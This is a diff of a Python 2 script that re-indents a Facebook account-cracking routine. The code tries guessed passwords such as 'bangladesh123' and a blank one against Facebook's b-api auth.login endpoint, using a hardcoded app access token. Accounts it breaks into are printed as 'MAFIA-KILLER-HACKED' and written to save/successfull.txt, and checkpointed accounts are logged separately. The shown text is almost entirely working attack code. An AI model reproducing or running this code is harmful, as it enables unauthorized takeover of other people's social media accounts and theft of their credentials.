@@ -383,33 +383,33 @@ def action():
                                                                         cps.close()
                                                                         cpb.append(c+user+pass3)
                                                                 else:
-                                                       pass4="bangladesh123"
-                                                       data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' +k+c+user+ '&locale=en_US&password=' + pass4 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
-                                    q = json.load(data)
-                                    if 'access_token' in q:
-                                        print '\x1b[1;91mMAFIA-KILLER-HACKED√\x1b[1;97m-\x1b[1;94m✙\x1b[1;96m-' + k + c + user + '-\x1b[1;93m✙\x1b[1;95m-' + pass4
-                                        okb = open('save/successfull.txt', 'a')
-                                        okb.write(k+c+user+pass4+'\n')
-                                        okb.close()
-                                        oks.append(c+user+pass4)
-                                    else:
-                                        if 'www.facebook.com' in q['error_msg']:
-                                            print '\x1b[1;92mAFTER(3DAYS)🗝\x1b[1;95m-\x1b[1;93m✙\x1b[1;96m-' + k + c + user + '-\x1b[1;93m✙\x1b[1;95m-' + pass4
-                                            cps = open('save/checkpoint.txt', 'a')
-                                            cps.write(k+c+user+pass4+'\n')
-                                            cps.close()
-                                            cpb.append(c+user+pass4)
-                                        else:
-                                            pass5=""
-                                            data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' +k+c+user+ '&locale=en_US&password=' + pass5 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
-                                            q = json.load(data)
-                                            if 'access_token' in q:
-                                                print '\x1b[1;91mMAFIA-KILLER-HACKED√\x1b[1;97m-\x1b[1;94m✙\x1b[1;96m-' + k + c + user + '-\x1b[1;93m✙\x1b[1;95m-' + pass5
-                                                okb = open('save/successfull.txt', 'a')
-                                                okb.write(k+c+user+pass5+'\n')
-                                                okb.close()
-                                                oks.append(c+user+pass5)
-                                            else:
+                                                                        pass4="bangladesh123"
+                                                                        data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' +k+c+user+ '&locale=en_US&password=' + pass4 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
+                                                                        q = json.load(data)
+                                                                        if 'access_token' in q:
+                                                                                print '\x1b[1;91mMAFIA-KILLER-HACKED√\x1b[1;97m-\x1b[1;94m✙\x1b[1;96m-' + k + c + user + '-\x1b[1;93m✙\x1b[1;95m-' + pass4
+                                                                                okb = open('save/successfull.txt', 'a')
+                                                                                okb.write(k+c+user+pass4+'\n')
+                                                                                okb.close()
+                                                                                oks.append(c+user+pass4)
+                                                                        else:
+                                                                                if 'www.facebook.com' in q['error_msg']:
+                                                                                        print '\x1b[1;92mAFTER(3DAYS)🗝\x1b[1;95m-\x1b[1;93m✙\x1b[1;96m-' + k + c + user + '-\x1b[1;93m✙\x1b[1;95m-' + pass4
+                                                                                        cps = open('save/checkpoint.txt', 'a')
+                                                                                        cps.write(k+c+user+pass4+'\n')
+                                                                                        cps.close()
+                                                                                        cpb.append(c+user+pass4)
+                                                                                else:
+                                                                                        pass5=""
+                                                                                        data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' +k+c+user+ '&locale=en_US&password=' + pass5 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
+                                                                                        q = json.load(data)
+                                                                                        if 'access_token' in q:
+                                                                                                print '\x1b[1;91mMAFIA-KILLER-HACKED√\x1b[1;97m-\x1b[1;94m✙\x1b[1;96m-' + k + c + user + '-\x1b[1;93m✙\x1b[1;95m-' + pass5
+                                                                                                okb = open('save/successfull.txt', 'a')
+                                                                                                okb.write(k+c+user+pass5+'\n')
+                                                                                                okb.close()
+                                                                                                oks.append(c+user+pass5)
+                                                                                        else:
                                                 if 'www.facebook.com' in q['error_msg']:
                                                     print '\x1b[1;92mAFTER(3DAYS)🗝\x1b[1;95m-\x1b[1;93m✙\x1b[1;96m-' + k + c + user + '-\x1b[1;93m✙\x1b[1;95m-' + pass5
                                                     cps = open('save/checkpoint.txt', 'a')
